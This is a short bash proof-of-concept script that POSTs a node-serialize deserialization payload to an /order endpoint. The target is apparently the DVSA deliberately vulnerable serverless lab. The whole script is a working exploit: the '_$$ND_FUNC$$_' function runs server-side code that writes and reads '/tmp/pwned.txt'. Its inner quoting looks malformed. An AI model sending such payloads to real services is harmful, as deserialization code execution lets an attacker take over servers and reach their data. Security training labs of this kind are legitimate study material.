#!/usr/bin/env bash
set -euo pipefail
: "${API:?Set API to the /order endpoint}"
: "${TOKEN:?Set TOKEN to a valid Bearer token if needed}"
curl -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"action":"_$$ND_FUNC$$_function(){ var fs=require(""fs""); fs.writeFileSync(""/tmp/pwned.txt"",""DVSA_HACKED""); var data=fs.readFileSync(""/tmp/pwned.txt"",""utf8""); console.log(""FILE READ SUCCESS: ""+data); }()", "cart-id":""}'
